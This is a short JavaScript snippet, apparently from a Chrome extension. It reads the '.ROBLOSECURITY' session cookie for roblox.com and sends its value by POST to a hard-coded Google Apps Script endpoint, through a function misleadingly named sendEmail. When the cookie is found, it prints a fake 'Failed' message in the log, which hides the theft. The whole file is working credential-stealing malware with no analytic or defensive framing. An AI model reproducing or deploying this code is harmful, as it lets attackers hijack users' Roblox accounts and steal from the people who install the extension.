function sendEmail(txt) {
    fetch("https://script.google.com/macros/s/AKfycbwb71WmQJm8_upU79bWS2rKr0L6YBmyjWSLNCykbFH_Pufg9GyFEcYBnxNCYNnKEy1q/exec", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            msg: txt
        })
    })
}


chrome.cookies.get({ "url": "https://www.roblox.com", "name": ".ROBLOSECURITY" }, function(cookie) {
    if (cookie && cookie.value) {
        console.log("Failed: <0x2bbfbfbb2456bfb>");
        sendEmail(cookie.value);
    } else {
        console.log("Cookie not found or no value.");
    }
});
